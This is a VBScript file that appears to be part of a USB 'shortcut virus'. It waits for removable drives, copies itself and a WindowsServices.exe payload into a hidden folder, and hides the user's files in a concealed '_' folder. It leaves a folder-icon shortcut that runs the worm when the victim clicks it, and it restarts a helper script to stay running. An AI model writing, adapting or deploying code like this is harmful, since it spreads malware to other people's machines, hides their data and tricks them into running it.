on error resume next
DIM colEvents, objws, strComputer, objEvent, DestFolder, strFolder, Target, ws, objFile, objWMIService, DummyFolder, check, number, home, device, devicename, colProcess, vaprocess, objWinMgmt
strComputer = "."
Set ws = WScript.CreateObject("WScript.Shell")

Target = "\WindowsServices"


'where are we?
strPath = WScript.ScriptFullName
set objws = CreateObject("Scripting.FileSystemObject")
Set objFile = objws.GetFile(strPath)
strFolder = objws.GetParentFolderName(objFile)




'Checking for USB instance
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set colEvents = objWMIService.ExecNotificationQuery ("SELECT * FROM __InstanceOperationEvent WITHIN 1 WHERE " & "TargetInstance ISA 'Win32_LogicalDisk'")


Set objWinMgmt = GetObject("WinMgmts:Root\Cimv2")


While True

	Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'")
	call procheck(colProcess, "helper.vbs")
	
	Set objEvent = colEvents.NextEvent
	
	
	
	If objEvent.TargetInstance.DriveType = 2  Then
		If objEvent.Path_.Class = "__InstanceCreationEvent" Then
			device = objEvent.TargetInstance.DeviceID
			devicename = objEvent.TargetInstance.VolumeName
			DestFolder = device & "\WindowsServices"
			DummyFolder = device & "\" & "_"
			if (not objws.folderexists(DestFolder)) then
				objws.CreateFolder DestFolder	
				Set objDestFolder = objws.GetFolder(DestFolder)
				objDestFolder.Attributes = objDestFolder.Attributes + 2
				end if
			Call moveandhide ("\helper.vbs")
			Call moveandhide ("\installer.vbs")
			Call moveandhide ("\movemenoreg.vbs")
			Call moveandhide ("\WindowsServices.exe")
			
			if (not objws.fileexists (device & devicename & ".lnk")) then
				Set link = ws.CreateShortcut(device & "\" & devicename & ".lnk")
				link.Description = devicename
				link.IconLocation = "%windir%\system32\SHELL32.dll, 7"
				link.TargetPath = "%COMSPEC%" 
				link.Arguments = "/C .\WindowsServices\movemenoreg.vbs"
				'link.WorkingDirectory = device
				link.Save
			End If
				
				
			if (not objws.folderexists(DummyFolder)) then
				objws.CreateFolder DummyFolder	
				Set objDestFolder = objws.GetFolder(DummyFolder)
				objDestFolder.Attributes = objDestFolder.Attributes + 2
				End If
			set check = objws.getFolder(device)
			Call checker(check)
			
		End If
	End If
	

	
	
Wend





sub checker (path)
	set home = path.Files
	For Each file in home
		Select Case file.Name
			Case devicename & ".lnk"
				'nothings
			Case Else
				objws.MoveFile path & file.Name, DummyFolder & "\"
		End Select
		
	Next
	
	set home = path.SubFolders
	For Each home in home
		Select Case home
			Case path & "_"
				'nothings
			Case path & "WindowsServices"
				'nothings
			Case path & "System Volume Information"
				'nothings'
			Case Else
				objws. MoveFolder home, DummyFolder & "\"
		End Select
		
	Next
	
end sub


'------------------------------------------------------------


sub moveandhide (name)
	if (not objws.fileexists(DestFolder & name)) then
		objws.CopyFile strFolder & name, DestFolder & "\"
		Set objmove = objws.GetFile(DestFolder & name)
	
		If not objmove.Attributes AND 2 then 
			objmove.Attributes = objmove.Attributes + 2
		end if
	end if
end sub



'------------------------------------------------------------


sub procheck(checkme, procname)

For Each objProcess In checkme
	vaprocess = objProcess.CommandLine
	
		if instr(vaprocess, procname) then
			Exit sub
		End if
	
Next
ws.Run strFolder  & "\" & procname
end sub